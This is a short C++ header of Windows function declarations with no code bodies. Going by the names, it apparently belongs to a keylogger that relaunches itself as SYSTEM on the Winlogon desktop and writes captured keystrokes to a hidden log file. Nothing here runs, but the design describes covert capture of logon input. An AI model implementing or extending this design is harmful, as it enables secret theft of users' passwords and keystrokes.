#pragma once
#include <string>
#include <windows.h>
#define WIN32_LEAN_AND_MEAN

bool isRunningAsSystem();

bool EnablePrivileges(LPCWSTR priv);

bool RelaunchAsSystem(const std::wstring cmdLine);

bool RelaunchWithWINLOGONDesktop(const std::wstring cmdLine);

std::wstring GetCurrentDesktopName();

void DisableBlinkingCursor();

std::string GetCurrentTimeAsString();

bool CreateDirectoryRecursive(const std::wstring& path);

bool WriteKeyLogToLogFileSystemHidden(const std::string &data);

std::wstring StringToWString(const std::string& str);